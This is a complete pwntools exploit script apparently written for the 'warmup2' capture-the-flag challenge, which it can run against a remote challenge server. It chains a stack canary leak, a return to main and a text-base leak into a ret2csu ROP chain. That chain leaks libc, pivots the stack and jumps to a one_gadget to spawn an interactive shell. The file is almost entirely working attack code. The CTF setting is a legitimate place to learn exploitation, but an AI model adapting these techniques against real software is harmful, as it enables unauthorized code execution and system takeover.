#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chal"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("warmup2.ctf.maplebacon.org", 1337)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        # 1st read
        #b *vuln+67
        # 2nd read
        #b *vuln+131
        # canary check
        #b *vuln+159
        # ret@vuln
        #b *vuln+180
        b *__libc_csu_init+64
        #b *__libc_csu_init+90
        #b read
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


# leak canary
payload = b""
payload += b"A" * 0x108
payload += b"B"

p.recvuntil("name?")
p.send(payload)
p.recvuntil(payload)
canary = u64(p8(0) + p.recv(7))
log.info("canary: " + hex(canary))

# ret2main && call vuln again
payload = b"C" * 0x108
payload += p64(canary)
payload += b"D" * 0x8
payload += p8(0xd8)

p.recvuntil("you?")
p.send(payload)

# leak text address
payload = b""
payload += b"E" * 0x108
payload += b"F" * 0x8 *2

p.recvuntil("name?")
p.send(payload)
p.recvuntil(payload)

leak = u64(p.recv(6) + b"\00\00")
log.info("main+0x44: " + hex(leak))
text_base = leak - elf.symbols['main'] - 0x44
log.info("text base: " + hex(text_base))
stk_pivot_addr = text_base + elf.get_section_by_name(".bss").header["sh_addr"] + 0x100

rop_pop_rdi_ret = text_base + 0x1353
rop_pop_rsi_pop_r15_ret  = text_base + 0x1351
rop_pop_rsp_pop_r13_pop_r14_pop_r15_ret  = text_base + 0x134d
payload = b"G" * 0x108
payload += p64(canary)
payload += b"H" * 0x8
payload += p64(rop_pop_rdi_ret)
payload += p64(text_base + elf.got['puts'])# will be a arg0
# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
payload += p64(text_base + elf.symbols['__libc_csu_init'] + 90)
# at __libc_csu_init + 64...
# r14 -> rdx (arg2)
# r13 -> rsi (arg1)
# r12 -> edi (part of arg0)
# r15 -> func_address (rbx == 0)
# call func(arg0, arg1, arg2)
payload += p64(0)# rbx (need to zero)
payload += p64(1)# rbp
payload += p64(text_base + elf.got['puts'])# r12(arg0)
payload += p64(8)# r13 (arg1)
payload += p64(1)# r14 (arg2)
payload += p64(text_base + elf.got['puts'])# r15 (func addr)
payload += p64(text_base + elf.symbols['__libc_csu_init'] + 73)
payload += b"I" * 0x8 * 7
payload += p64(text_base + elf.symbols['__libc_csu_init'] + 90)
payload += p64(0)# rbx (need to zero)
payload += p64(1)# rbp
payload += p64(0)# r12(arg0)
payload += p64(stk_pivot_addr)# r13 (arg1)
payload += p64(0x1000)# r14 (arg2)
payload += p64(text_base + elf.got['read'])# r15 (func addr)
payload += p64(text_base + elf.symbols['__libc_csu_init'] + 64)
payload += b"J" * 0x8 * 7
payload += p64(rop_pop_rsp_pop_r13_pop_r14_pop_r15_ret)
payload += p64(stk_pivot_addr)
payload += b"K" * 0x8 * 3
payload += p64(stk_pivot_addr)

p.recvuntil("you?")
p.send(payload)
p.recvuntil("too!\n")
puts_libc_addr = u64(p.recv(6) + b"\00\00")
log.info("puts@libc: " + hex(puts_libc_addr))
libc_base = puts_libc_addr - 0x84420
log.info("libc base: " + hex(libc_base))
one_gadget = libc_base + 0xe3afe
log.info("One Gadget: " + hex(one_gadget))
#system_libc_addr = libc_base + 0x52290
#log.info("system@libc: " + hex(system_libc_addr))
#binsh_addr = libc_base + 0x1b45bd
#log.info("/bin/sh@libc: " + hex(binsh_addr))
log.info("stack pivot: RSP -> " + hex(stk_pivot_addr))

# exec shell
rop_pop_r12_pop_r13_pop_r14_pop_r15_ret = text_base + 0x134c
payload = b"L" * 0x8 * 3
payload += p64(rop_pop_r12_pop_r13_pop_r14_pop_r15_ret)
payload += p64(0)
payload += p64(0xdeadbeefcafebabe) * 2
payload += p64(0)
payload += p64(one_gadget)

sleep(2)
p.send(payload)

p.interactive()
